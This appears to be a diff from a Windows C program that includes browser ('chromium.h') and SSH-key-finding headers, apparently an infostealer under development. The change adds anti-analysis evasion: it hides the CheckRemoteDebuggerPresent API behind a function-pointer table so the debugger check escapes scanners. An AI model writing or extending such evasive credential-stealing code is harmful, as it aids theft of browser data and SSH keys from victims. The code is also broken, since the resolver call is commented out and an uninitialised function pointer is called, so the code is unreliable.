@@ -2,8 +2,10 @@
 
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <wchar.h>
 #include <windows.h>
+#include <winnt.h>
 
 #include "chromium.h"
 #include "find_ssh_key.h"
@@ -19,7 +21,12 @@ int main(void) {
   BOOL isDebuggerPresent = FALSE;
   HANDLE hProcess = GetCurrentProcess();
 
-  if (CheckRemoteDebuggerPresent(hProcess, &isDebuggerPresent)) {
+  PCheckRemoteDebuggerPresent func;
+  hidden_apis apis[] = {func};
+  // resolve_apis(apis); type problem
+
+  if (func(hProcess, &isDebuggerPresent)) {
+    printf("Nice call\n");
     if (isDebuggerPresent) {
 #ifdef DEBUG
       printf("Un débogueur est détecté sur ce processus.\n");
